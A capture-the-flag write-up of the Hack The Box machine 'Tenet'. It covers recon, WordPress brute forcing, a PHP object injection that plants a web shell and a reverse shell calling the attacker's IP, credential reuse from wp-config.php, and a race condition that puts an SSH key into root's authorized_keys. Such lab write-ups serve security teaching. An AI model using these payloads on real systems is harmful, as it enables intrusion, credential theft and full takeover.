
![Image Tenet]()


## ---------->> Tenet <<-------------


// We start with nmap scan 

    $ nmap -sV -A -Pn -T4 10.10.10.223 -p-
--------

    Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-14 17:33 EDT
    Stats: 0:07:45 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
    Connect Scan Timing: About 68.49% done; ETC: 17:45 (0:03:33 remaining)
    Nmap scan report for 10.10.10.223
    Host is up (0.22s latency).
    Not shown: 65533 closed tcp ports (conn-refused)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)
    |   256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)
    |_  256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-title: Apache2 Ubuntu Default Page: It works
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

// Navigating to http://10.10.10.223/ to apache2 ubunto default page

![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Tenet/1.png)

// Lets search for interesting directories or files with [dirsearch](https://github.com/maurosoria/dirsearch)(By maurosoria).

    $ python3 dirsearch.py -u http://10.10.10.223/ -t 100
------

      _|. _ _  _  _  _ _|_    v0.4.1
     (_||| _) (/_(_|| (_| )

    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 100 | Wordlist size: 10903

    Output File: /home/r4r3/Desktop/HTB/main-Tools/web/directories_scanners/dirsearch/reports/10.10.10.223/_21-09-14_18-17-51.txt

    Error Log: /home/r4r3/Desktop/HTB/main-Tools/web/directories_scanners/dirsearch/logs/errors-21-09-14_18-17-51.log

    Target: http://10.10.10.223/

    [18:17:52] Starting: 
    [18:18:01] 403 -  277B  - /.htaccess.bak1
    ...
    [18:18:01] 403 -  277B  - /.htpasswd_test
    [18:18:01] 403 -  277B  - /.php
    [18:18:13] 200 -   11KB - /index.html
    [18:18:18] 403 -  277B  - /server-status/
    [18:18:18] 403 -  277B  - /server-status
    [18:18:20] 200 -    8B  - /users.txt
    [18:18:21] 200 -    6KB - /wordpress/wp-login.php

// We can see dirsearch found a wordpress login page 

// Navigate to http://10.10.10.223/wordpress/wp-login.php we can see login page and redirection buttons

// When click '<- Go to Tenet' its redirect us to http://tenet.htb/

![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Tenet/2.png)

// So lets add the domain to /etc/hosts

    $ cat /etc/hosts
    
    # Host addresses
    10.10.10.223 tenet.htb

// Now lets navigate to http://tenet.htb/ 

![Image 6](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Tenet/6.png)

// It seems like some company software website

// Lets search again with dirsearch

    $ python3 dirsearch.py -u http://tenet.htb/ -t 100
-----

      _|. _ _  _  _  _ _|_    v0.4.1
     (_||| _) (/_(_|| (_| )

    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 100 | Wordlist size: 10903

    Output File: /home/r4r3/Desktop/HTB/main-Tools/web/directories_scanners/dirsearch/reports/tenet.htb/_21-09-14_18-28-26.txt

    Error Log: /home/r4r3/Desktop/HTB/main-Tools/web/directories_scanners/dirsearch/logs/errors-21-09-14_18-28-26.log

    Target: http://tenet.htb/

    [18:28:28] Starting: 
    [18:28:39] 403 -  274B  - /.ht_wsr.txt
    [18:28:39] 403 -  274B  - /.htaccess.sample
    ...
    [18:28:40] 403 -  274B  - /.htaccess.bak1
    [18:28:40] 403 -  274B  - /.php
    [18:29:00] 301 -    0B  - /index.php  ->  http://tenet.htb/
    [18:29:01] 200 -   19KB - /license.txt
    [18:29:06] 200 -    7KB - /readme.html
    [18:29:07] 403 -  274B  - /server-status
    [18:29:07] 403 -  274B  - /server-status/
    [18:29:13] 301 -  309B  - /wp-admin  ->  http://tenet.htb/wp-admin/
    [18:29:13] 400 -    1B  - /wp-admin/admin-ajax.php
    [18:29:13] 409 -    3KB - /wp-admin/setup-config.php
    [18:29:14] 200 -    0B  - /wp-includes/rss-functions.php
    [18:29:14] 302 -    0B  - /wp-admin/  ->  http://tenet.htb/wp-login.php?redirect_to=http%3A%2F%2Ftenet.htb%2Fwp-admin%2F&reauth=1
    [18:29:14] 200 -    1KB - /wp-admin/install.php
    [18:29:14] 301 -  311B  - /wp-content  ->  http://tenet.htb/wp-content/
    [18:29:14] 200 -    0B  - /wp-cron.php
    [18:29:14] 200 -    0B  - /wp-content/
    [18:29:14] 200 -    6KB - /wp-login.php
    [18:29:14] 301 -  312B  - /wp-includes  ->  http://tenet.htb/wp-includes/
    [18:29:14] 302 -    0B  - /wp-signup.php  ->  http://tenet.htb/wp-login.php?action=register
    [18:29:14] 200 -    0B  - /wp-config.php
    [18:29:14] 500 -    0B  - /wp-content/plugins/hello.php
    [18:29:14] 200 -   69B  - /wp-content/plugins/akismet/akismet.php
    [18:29:14] 200 -  963B  - /wp-content/uploads/
    [18:29:15] 200 -   48KB - /wp-includes/
    [18:29:15] 405 -   42B  - /xmlrpc.php

// Now we get more info 

// Navigating to http://tenet.htb/wp-login.php , get us to wp login page

// What i have notice when tring admin:admin and other creds

// Is that when u send a correct username with random password, it will respond differently

// First i tried admin and failed (notice the response)

![Image 3](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Tenet/3.png)

// Now after some digging on http://tenet.htb/ , and click on 'Migration'

// I see  there 2 usernames

![Image 4](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Tenet/4.png)

    protagonist
    neil

// Now i tried to connect with them(notice the response)

![Image 5](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Tenet/5.png)

// Same response for user 'neil', now that we have 2 usernames we can try to use MetaSploit

    msf6 auxiliary(scanner/http/wordpress_login_enum) > options 

    Module options (auxiliary/scanner/http/wordpress_login_enum):

       Name                 Current Setting                                 Required  Description
       ----                 ---------------                                 --------  -----------
       BLANK_PASSWORDS      false                                           no        Try blank passwords for all users
       BRUTEFORCE           true                                            yes       Perform brute force authentication
       BRUTEFORCE_SPEED     5                                               yes       How fast to bruteforce, from 0 to 5
       DB_ALL_CREDS         false                                           no        Try each user/password couple stored in the current database
       DB_ALL_PASS          false                                           no        Add all passwords in the current database to the list
       DB_ALL_USERS         false                                           no        Add all users in the current database to the list
       ENUMERATE_USERNAMES  true                                            yes       Enumerate usernames
       PASSWORD                                                             no        A specific password to authenticate with
       PASS_FILE            rockyou.txt                                     no        File containing passwords, one per line
       Proxies                                                              no        A proxy chain of format type:host:port[,type:host:port][...]
       RANGE_END            10                                              no        Last user id to enumerate
       RANGE_START          1                                               no        First user id to enumerate
       RHOSTS               tenet.htb                                       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
       RPORT                80                                              yes       The target port (TCP)
       SSL                  false                                           no        Negotiate SSL/TLS for outgoing connections
       STOP_ON_SUCCESS      false                                           yes       Stop guessing when a credential works for a host
       TARGETURI            /                                               yes       The base path to the wordpress application
       THREADS              1                                               yes       The number of concurrent threads (max one per host)
       USERNAME             protagonist                                     no        A specific username to authenticate as
       USERPASS_FILE                                                        no        File containing users and passwords separated by space, one pair per line
       USER_AS_PASS         false                                           no        Try the username as the password for all users
       USER_FILE                                                            no        File containing usernames, one per line
       VALIDATE_USERS       true                                            yes       Validate usernames
       VERBOSE              true                                            yes       Whether to print output for all attempts
       VHOST                                                                no        HTTP server virtual host          

// Tried to Brute force the password for 'protagonist' with Metasploit seems to take forever(waited 4 hours till i got frustrated)

// So i go back to http://tenet.htb/ to try find more clues...

// Clicking on 'Migration' again we could see users 'neil' comment talking about missing file called sator.php and backup

![Image 7](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Tenet/7.png)

// When navigating to http://tenet.htb/sator.php file indeed not found, BUT,

// Navigating to http://10.10.10.223/sator.php give us page 

![Image 8](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Tenet/8.png)

// Now lets search the backup file

// First tried wfuzz http://10.10.10.223/

    $ wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.223/FUZZ --hh 274
------

    ********************************************************
    * Wfuzz 3.1.0 - The Web Fuzzer                         *
    ********************************************************

    Target: http://10.10.10.223/FUZZ
    Total requests: 220560

    =====================================================================
    ID           Response   Lines    Word       Chars       Payload                                                                                                                                       
    =====================================================================                                                                             
    000000587:   301        9 L      28 W       316 Ch      "wordpress"                              
    000045240:   200        375 L    964 W      10918 Ch    "http://10.10.10.223/"              
    000095524:   403        9 L      28 W       277 Ch      "server-status"        

// Nothing much there so next i tried with fuzz sator. extentions

    $ wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.223/sator.FUZZ --hh 274
--------

    ********************************************************
    * Wfuzz 3.1.0 - The Web Fuzzer                         *
    ********************************************************

    Target: http://10.10.10.223/sator.FUZZ
    Total requests: 220560
    =====================================================================
    ID           Response   Lines    Word       Chars       Payload                                                                         
    =====================================================================
    000000338:   200        1 L      11 W       63 Ch       "php"     

// Nothing there either.. finally i searched sator.php. extentions

$ wfuzz -c -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.223/sator.php.FUZZ --hh 274

    ********************************************************
    * Wfuzz 3.1.0 - The Web Fuzzer                         *
    ********************************************************

    Target: http://10.10.10.223/sator.php.FUZZ
    Total requests: 220560
    =====================================================================
    ID           Response   Lines    Word       Chars       Payload                                                                         
    =====================================================================
    000008552:   200        31 L     70 W       514 Ch      "bak"   
 
// Great we found extention 'bak', lets navigate to http://10.10.10.223/sator.php.bak to see his content
 
![Image 8.1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Tenet/8.1.png)
 
    $ cat sator.php.bak 

    <?php

    class DatabaseExport
    {
        public $user_file = 'users.txt';
        public $data = '';

        public function update_db()
        {
            echo '[+] Grabbing users from text file <br>';
            $this-> data = 'Success';
        }


        public function __destruct()
        {
            file_put_contents(__DIR__ . '/' . $this ->user_file, $this->data);
            echo '[] Database updated <br>';
        //	echo 'Gotta get this working properly...';
        }
    }

    $input = $_GET['arepo'] ?? '';
    $databaseupdate = unserialize($input);

    $app = new DatabaseExport;
    $app -> update_db();

    ?>

// Its a PHP script, lets try to understand him 

// The script has [class](https://www.zend.com/blog/what-php-class) called 'DatabaseExport'

// And it contains usr_file called 'users.txt' and '$data' that will be a string(in our case 'Success')

// Next we have function called 'update_db' that first prints string and insert string to value '$data'

// Next we have another function called 'destruct' , this function uses 'file_put_contents' to write '$data' content to file 'users.txt'

// Also earlier we see that dirsearch find http://10.10.10.223/users.txt page that indeed print 'SUCCESS'

// Next we can see there is a variable 'arepo' , that called with GET method 

// And the script takes string query passed in the variable 'arepo' OR a blank string([?? ''](https://www.tutorialspoint.com/php7/php7_coalescing_operator.htm)) 

// And finally [unserialize](https://www.php.net/manual/en/function.unserialize.php) with the input command to update data base.

---> [Wikipedia source](https://en.wikipedia.org/wiki/Sator_Square) <---

    "" In computing, serialization (US spelling) or serialisation (UK spelling) is the process of translating a data structure
    or object state into a format that can be stored (for example, in a file or memory data buffer) or transmitted
    (for example, over a computer network) and reconstructed later (possibly in a different computer environment) ""

// So here i understand that serialization is to take file and change him into a format that program understand and can be stored.

// So basically in our case the vulnerability is that the program can pass unserialize(Not checked) value,

// And actually its a door to [PHP Object injection](https://www.youtube.com/watch?v=HaW15aMzBUM)(ippsec video) !

// [OWASP source](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection) AND [This source](https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a) also put some light on PHP Object injection

// So according to the sources,

// First, we need to check if can control the output file

![Image 9](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Tenet/9.png)

    $ cat attack.php

    <?php

    class DatabaseExport
    {
        public function __construct()
        {
            $this->user_file = 'W0lfysec.txt';
            $this->data = 'MY_TEST';
        }
    }

    echo urlencode(serialize(new DatabaseExport));
    echo "\n";

    ?>

// Run our file to get URL encoded payload

    $ php attack.php 
    
    O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A12%3A%22W0lfysec.txt%22%3Bs%3A4%3A%22data%22%3Bs%3A7%3A%22MY_TEST%22%3B%7D

// And add the payload to http://10.10.10.223/sator.php?arepo=PAYLOAD

![Image 10](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Tenet/10.png)

// We can see there 2 strings duplicated strings abour DB being updated

// Its ok, it indicates about 2 objects instantiated.

// Check if worked navigate to http://10.10.10.223/YOURS-user_file-NAME

![Image 11](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Tenet/11.png)

// And it worked !

// Next we will try to inject a command cli with [$_REQUEST](https://www.w3schools.com/php/php_superglobals_request.asp)

![Image 12](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Tenet/12.png)

    $ cat attack2.php 

    <?php

    class DatabaseExport
    {
        public function __construct()
        {
            $this->user_file = 'W0lfysec.php';
            $this->data = '<?php system($_REQUEST[\'command\']);?>';
        }
    }

    echo urlencode(serialize(new DatabaseExport));
    echo "\n";

    ?>

// And we test it same way 

    $curl -i http://10.10.10.223/W0lfysec.php?command=whoami
    HTTP/1.1 200 OK
    Date: Thu, 16 Sep 2021 16:13:39 GMT
    Server: Apache/2.4.29 (Ubuntu)
    Content-Length: 9
    Content-Type: text/html; charset=UTF-8

    www-data

// It worked !!!

// Lets now make reverse shell 

    $ cat attack3.php 

    <?php

    class DatabaseExport
    {
        public function __construct()
        {
            $this->user_file = 'W0lfysec.php';
            $this->data = '<?php $sock=fsockopen("10.10.16.6",1444);exec("/bin/sh -i <&3 >&3 2>&3");?>';
        }
    }

    echo urlencode(serialize(new DatabaseExport));
    echo "\n";

    ?>
-------

    $nc -lvnp 1444
    listening on [any] 1444 ...
    connect to [10.10.16.6] from (UNKNOWN) [10.10.10.223] 57626

// First try with [pentestmonkey query](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) in same way we did before response with connection but dies fast...

// Lets try another way, So i used bash script with php command exec ([Source GTFOBins](https://gtfobins.github.io/gtfobins/bash/))

![Image 13](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Tenet/13.png)

// First open a listiner

    $ nc -lvnp 1444
    listening on [any] 1444 ...
    
// And reapet the stages to get a shell !!

    $ nc -lvnp 1444
    listening on [any] 1444 ...
    connect to [10.10.16.6] from (UNKNOWN) [10.10.10.223] 57628
    bash: cannot set terminal process group (1615): Inappropriate ioctl for device
    bash: no job control in this shell
    www-data@tenet:/var/www/html$ id
    id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    www-data@tenet:/var/www/html$ 

// We not have permissions to open user.txt ...

    www-data@tenet:/home/neil$ cat user.txt
    cat user.txt
    cat: user.txt: Permission denied

// When try to search for some clues or passwords i have notice that the directory we get when got the shell

// its same directory where the wordpress configurations are

    www-data@tenet:/var/www/html$ ls -al
    ls -al
    total 44
    drwxr-xr-x 3 www-data www-data  4096 Sep 16 15:49 .
    drwxr-xr-x 3 root     root      4096 Dec 16  2020 ..
    -rw-r--r-- 1 www-data www-data    72 Sep 16 16:44 W0lfysec.php
    -rw-r--r-- 1 www-data www-data    24 Sep 16 15:39 W0lfysec.txt
    -rw-r--r-- 1 www-data www-data 10918 Dec 16  2020 index.html
    -rwxr-xr-x 1 www-data www-data   514 Dec 17  2020 sator.php
    -rwxr-xr-x 1 www-data www-data   514 Dec 17  2020 sator.php.bak
    -rw-r--r-- 1 www-data www-data     7 Sep 16 16:44 users.txt
    -rw-r--r-- 1 www-data www-data     0 Sep 16 15:49 whoami
    drwxr-xr-x 5 www-data www-data  4096 Sep 16 14:32 wordpress     <<<-----------------------
    www-data@tenet:/var/www/html$ cd wordpress
    cd wordpress
    www-data@tenet:/var/www/html/wordpress$ ls -al
    ls -al
    total 228
    drwxr-xr-x  5 www-data www-data  4096 Sep 16 14:32 .
    drwxr-xr-x  3 www-data www-data  4096 Sep 16 15:49 ..
    -rw-r--r--  1 www-data www-data   405 Feb  6  2020 index.php
    -rw-r--r--  1 www-data www-data 19915 Feb 12  2020 license.txt
    -rw-r--r--  1 www-data www-data  7278 Jun 26  2020 readme.html
    -rw-r--r--  1 www-data www-data  7101 Jul 28  2020 wp-activate.php
    drwxr-xr-x  9 www-data www-data  4096 Dec  8  2020 wp-admin
    -rw-r--r--  1 www-data www-data   351 Feb  6  2020 wp-blog-header.php
    -rw-r--r--  1 www-data www-data  2328 Oct  8  2020 wp-comments-post.php
    -rw-r--r--  1 www-data www-data  2913 Feb  6  2020 wp-config-sample.php
    -rw-r--r--  1 www-data www-data  3185 Jan  7  2021 wp-config.php
    drwxr-xr-x  5 www-data www-data  4096 Sep 16 14:32 wp-content
    -rw-r--r--  1 www-data www-data  3939 Jul 30  2020 wp-cron.php
    drwxr-xr-x 25 www-data www-data 12288 Dec  8  2020 wp-includes
    -rw-r--r--  1 www-data www-data  2496 Feb  6  2020 wp-links-opml.php
    -rw-r--r--  1 www-data www-data  3300 Feb  6  2020 wp-load.php
    -rw-r--r--  1 www-data www-data 49831 Nov  9  2020 wp-login.php
    -rw-r--r--  1 www-data www-data  8509 Apr 14  2020 wp-mail.php
    -rw-r--r--  1 www-data www-data 20975 Nov 12  2020 wp-settings.php
    -rw-r--r--  1 www-data www-data 31337 Sep 30  2020 wp-signup.php
    -rw-r--r--  1 www-data www-data  4747 Oct  8  2020 wp-trackback.php
    -rw-r--r--  1 www-data www-data  3236 Jun  8  2020 xmlrpc.php

// Now i tried to search the string 'pass' in the wordpress files

    www-data@tenet:/var/www/html/wordpress$ cat index.php | grep pass
    cat index.php | grep pass
    www-data@tenet:/var/www/html/wordpress$ cat license.txt | grep pass
    cat license.txt | grep pass
    www-data@tenet:/var/www/html/wordpress$ cat readme.html | grep pass
    cat readme.html | grep pass
    www-data@tenet:/var/www/html/wordpress$ cat wp-config.php |grep pass
    cat wp-config.php |grep pass
    /** MySQL database password */
    
// Its seems that wp-config has a password, Lets check it out

    www-data@tenet:/var/www/html/wordpress$ cat wp-config.php
    cat wp-config.php
    <?php
    ...

    // ** MySQL settings - You can get this info from your web host ** //
    /** The name of the database for WordPress */
    define( 'DB_NAME', 'wordpress' );

    /** MySQL database username */
    define( 'DB_USER', 'neil' );

    /** MySQL database password */
    define( 'DB_PASSWORD', 'Opera2112' );

    /** MySQL hostname */
    define( 'DB_HOST', 'localhost' );

    ...

// There is users 'neil' DB creds

// Lets try to SSH to host with user neil and password Opera2112

    $ ssh neil@10.10.10.223
    Warning: Permanently added '10.10.10.223' (ECDSA) to the list of known hosts.
    neil@10.10.10.223's password: 
    Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)

    neil@tenet:~$ id
    uid=1001(neil) gid=1001(neil) groups=1001(neil)

// Alsome ! it worked !

// Lets get user flag 

    neil@tenet:~$ cat user.txt 
    ae2a70c............................


### ----- Privilleges Escalation ------


// Lets run sudo -l to check neil's sudo permissions

    $ sudo -l
    Matching Defaults entries for neil on tenet:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:

    User neil may run the following commands on tenet:
        (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh

// Its seems we can run file called 'enableSSH.sh' with sudo and withouth password

// Lets check what this file does

![Image 14](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Tenet/14.png)

    #!/bin/bash

    checkAdded() {
    
        sshName=$(/bin/echo $key | /usr/bin/cut -d " " -f 3)
        if [[ ! -z $(/bin/grep $sshName /root/.ssh/authorized_keys) ]]; then
            /bin/echo "Successfully added $sshName to authorized_keys file!"
        else
            /bin/echo "Error in adding $sshName to authorized_keys file!"
        fi

    }

    checkFile() {
        if [[ ! -s $1 ]] || [[ ! -f $1 ]]; then
            /bin/echo "Error in creating key file!"
            if [[ -f $1 ]]; then /bin/rm $1; fi
            exit 1
        fi

    }

    addKey() {
        tmpName=$(mktemp -u /tmp/ssh-XXXXXXXX)
        (umask 110; touch $tmpName)
        /bin/echo $key >>$tmpName
        checkFile $tmpName
        /bin/cat $tmpName >>/root/.ssh/authorized_keys
        /bin/rm $tmpName

    }

    key="ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu"
    addKey
    checkAdded

// From first enspection it seems that elf(linux exacutable) file is added ssh_public_key to root's authorized_keys

// BUT, when analyze the addkey() function i have noticed that the ssh_key get copied to authorized_keys from /tmp/ssh-XXXXXXXXXX

// XXXXXX - replaced with random characters , then it deletes the rmp file. So we in kind of race condition

// Since we not have write permissions on this file we need to come up with other way to inject our own ssh public key

// That insert our own ssh-public-key before the elf sends it to root authorized_keys.

// So i came up with idea to make a script that have a loop that insert my own key to /tmp/ssh-XXXXXXXXXX folder

// Since i comftrable more with python i checked if the host has python(hoist have python3)

    neil@tenet:~$ which python
    neil@tenet:~$ which python3
    /usr/bin/python3

// First we need to generate our own ssh key

    $ ssh-keygen
----

    $cat id_rsa.pub 
    ssh-rsa AAAAB3NzaC1yc...............

// Copy the key and lets make our script on the host machine(i called the script pythonS.py)

    $ cat pythonS.py 
    #!/usr/bin/python3

    import os

    a = 1

    while a == 1:
       os.system("echo 'ssh-rsa AAAAB3NzaC1...........' | tee /tmp/ssh* > /dev/null")

// Now run the python file on the host machine

    neil@tenet:~$ python3 pythonS.py 

// Now run the elf for few times

    neil@tenet:~$ sudo /usr/local/bin/enableSSH.sh
    Successfully added root@ubuntu to authorized_keys file!
    neil@tenet:~$ sudo /usr/local/bin/enableSSH.sh
    Error in adding root@ubuntu to authorized_keys file!
    neil@tenet:~$ sudo /usr/local/bin/enableSSH.sh
    Successfully added root@ubuntu to authorized_keys file!
    neil@tenet:~$ sudo /usr/local/bin/enableSSH.sh
    Successfully added root@ubuntu to authorized_keys file!
    neil@tenet:~$ sudo /usr/local/bin/enableSSH.sh
    Successfully added root@ubuntu to authorized_keys file!
    neil@tenet:~$ sudo /usr/local/bin/enableSSH.sh
    Successfully added root@ubuntu to authorized_keys file!
    neil@tenet:~$ sudo /usr/local/bin/enableSSH.sh
    Successfully added root@ubuntu to authorized_keys file!

// And successfuly ssh with our private key as root to the machine !

    $ssh -i id_rsa root@10.10.10.223
    Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-129-generic x86_64)

    root@tenet:~# 
    
// And we got the flag !

    root@tenet:~# ls
    root.txt
    root@tenet:~# cat root.txt
    39b353f.............................
